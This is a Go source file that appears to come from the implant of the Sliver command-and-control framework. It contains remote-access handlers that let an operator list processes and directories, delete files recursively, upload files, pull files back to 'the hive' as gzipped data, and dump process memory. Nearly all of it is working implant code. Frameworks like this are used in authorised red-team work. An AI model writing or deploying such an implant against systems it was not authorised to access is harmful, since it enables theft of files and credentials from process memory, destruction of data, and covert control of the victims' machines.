package main

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	pb "sliver/protobuf"

	"github.com/golang/protobuf/proto"
)

// ---------------- Cross-platform Handlers ----------------
func killHandler(send chan pb.Envelope, data []byte) {
	log.Printf("Received kill command\n")
	os.Exit(0)
}

func pingHandler(send chan pb.Envelope, data []byte) {
	ping := &pb.Ping{}
	err := proto.Unmarshal(data, ping)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	log.Printf("ping id = %s", ping.Id)
	data, _ = proto.Marshal(ping)
	envelope := pb.Envelope{
		Id:   ping.Id,
		Type: "ping",
		Data: data,
	}
	send <- envelope
}

func psHandler(send chan pb.Envelope, data []byte) {
	psListReq := &pb.ProcessListReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	procs, err := Processes()
	if err != nil {
		log.Printf("failed to list procs %v", err)
	}

	psList := &pb.ProcessList{Processes: []*pb.Process{}}

	for _, proc := range procs {
		psList.Processes = append(psList.Processes, &pb.Process{
			Pid:        int32(proc.Pid()),
			Ppid:       int32(proc.PPid()),
			Executable: proc.Executable(),
			Owner:      proc.Owner(),
		})
	}
	data, _ = proto.Marshal(psList)
	envelope := pb.Envelope{
		Id:   psListReq.Id,
		Type: pb.MsgPsList,
		Data: data,
	}
	send <- envelope
}

func dirListHandler(send chan pb.Envelope, data []byte) {
	dirListReq := &pb.DirListReq{}
	err := proto.Unmarshal(data, dirListReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	dir, files, err := getDirList(dirListReq.Path)

	// Convert directory listing to protobuf
	dirList := &pb.DirList{Path: dir}
	if err == nil {
		dirList.Exists = true
	} else {
		dirList.Exists = false
	}
	dirList.Files = []*pb.FileInfo{}
	for _, fileInfo := range files {
		dirList.Files = append(dirList.Files, &pb.FileInfo{
			Name:  fileInfo.Name(),
			IsDir: fileInfo.IsDir(),
			Size:  fileInfo.Size(),
		})
	}

	// Send back the response
	data, _ = proto.Marshal(dirList)
	envelope := pb.Envelope{
		Id:   dirListReq.Id,
		Type: pb.MsgDirList,
		Data: data,
	}
	send <- envelope
}

func getDirList(target string) (string, []os.FileInfo, error) {
	dir, _ := filepath.Abs(target)
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(dir)
		return dir, files, err
	}
	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
}

func rmHandler(send chan pb.Envelope, data []byte) {
	rmReq := &pb.RmReq{}
	err := proto.Unmarshal(data, rmReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}

	rm := &pb.Rm{}
	target, _ := filepath.Abs(rmReq.Path)
	rm.Path = target
	_, err = os.Stat(target)
	if err == nil {
		err = os.RemoveAll(target)
		if err == nil {
			rm.Success = true
		} else {
			rm.Success = false
			rm.Err = fmt.Sprintf("%v", err)
		}
	} else {
		rm.Success = false
		rm.Err = fmt.Sprintf("%v", err)
	}

	data, _ = proto.Marshal(rm)
	envelope := pb.Envelope{
		Id:   rmReq.Id,
		Type: pb.MsgRm,
		Data: data,
	}
	send <- envelope
}

func mkdirHandler(send chan pb.Envelope, data []byte) {
	mkdirReq := &pb.MkdirReq{}
	err := proto.Unmarshal(data, mkdirReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}

	mkdir := &pb.Mkdir{}
	target, _ := filepath.Abs(mkdirReq.Path)
	mkdir.Path = target

	err = os.MkdirAll(target, os.ModePerm)
	if err == nil {
		mkdir.Success = true
	} else {
		mkdir.Success = false
		mkdir.Err = fmt.Sprintf("%v", err)
	}

	data, _ = proto.Marshal(mkdir)
	envelope := pb.Envelope{
		Id:   mkdirReq.Id,
		Type: pb.MsgRm,
		Data: data,
	}
	send <- envelope

}

func cdHandler(send chan pb.Envelope, data []byte) {
	cdReq := &pb.CdReq{}
	err := proto.Unmarshal(data, cdReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}

	os.Chdir(cdReq.Path)
	dir, err := os.Getwd()
	pwd := &pb.Pwd{Path: dir}
	if err != nil {
		pwd.Err = fmt.Sprintf("%v", err)
	}

	data, _ = proto.Marshal(pwd)
	envelope := pb.Envelope{
		Id:   cdReq.Id,
		Type: pb.MsgPwd,
		Data: data,
	}
	send <- envelope
}

func pwdHandler(send chan pb.Envelope, data []byte) {
	pwdReq := &pb.PwdReq{}
	err := proto.Unmarshal(data, pwdReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}

	dir, err := os.Getwd()
	pwd := &pb.Pwd{Path: dir}
	if err != nil {
		pwd.Err = fmt.Sprintf("%v", err)
	}

	data, _ = proto.Marshal(pwd)
	envelope := pb.Envelope{
		Id:   pwdReq.Id,
		Type: pb.MsgPwd,
		Data: data,
	}
	send <- envelope
}

// Send a file back to the hive
func downloadHandler(send chan pb.Envelope, data []byte) {
	downloadReq := &pb.DownloadReq{}
	err := proto.Unmarshal(data, downloadReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	target, _ := filepath.Abs(downloadReq.Path)
	rawData, err := ioutil.ReadFile(target)

	var download *pb.Download
	if err == nil {
		gzipData := bytes.NewBuffer([]byte{})
		gzipWrite(gzipData, rawData)
		download = &pb.Download{
			Path:    target,
			Data:    gzipData.Bytes(),
			Encoder: "gzip",
			Exists:  true,
		}
	} else {
		download = &pb.Download{Path: target, Exists: false}
	}

	data, _ = proto.Marshal(download)
	envelope := pb.Envelope{
		Id:   downloadReq.Id,
		Type: pb.MsgDownload,
		Data: data,
	}
	send <- envelope
}

func uploadHandler(send chan pb.Envelope, data []byte) {
	uploadReq := &pb.UploadReq{}
	err := proto.Unmarshal(data, uploadReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}

	upload := &pb.Upload{Path: uploadReq.Path}
	f, err := os.Create(uploadReq.Path)
	if err != nil {
		upload.Err = fmt.Sprintf("%v", err)
		upload.Success = false
	} else {
		defer f.Close()
		data, err := gzipRead(uploadReq.Data)
		if err != nil {
			upload.Err = fmt.Sprintf("%v", err)
			upload.Success = false
		} else {
			f.Write(data)
			upload.Success = true
		}
	}

	data, _ = proto.Marshal(upload)
	envelope := pb.Envelope{
		Id:   uploadReq.Id,
		Type: pb.MsgUpload,
		Data: data,
	}
	send <- envelope

}

func dumpHandler(send chan pb.Envelope, data []byte) {
	procDumpReq := &pb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		log.Println("error decoding message: %v", err)
		return
	}
	res, err := DumpProcess(procDumpReq.Pid)
	dumpResp := &pb.ProcessDump{Data: res.Data()}
	if err == nil {
		dumpResp.Err = ""
	} else {
		dumpResp.Err = fmt.Sprintf("%v", err)
	}
	data, _ = proto.Marshal(dumpResp)
	envelope := pb.Envelope{
		Id:   procDumpReq.Id,
		Type: pb.MsgProcessDump,
		Data: data,
	}
	send <- envelope
}

// ---------------- Data Encoders ----------------
func gzipWrite(w io.Writer, data []byte) error {
	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
	defer gw.Close()
	gw.Write(data)
	return err
}

func gzipRead(data []byte) ([]byte, error) {
	bytes.NewReader(data)
	reader, _ := gzip.NewReader(bytes.NewReader(data))
	var buf bytes.Buffer
	_, err := buf.ReadFrom(reader)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
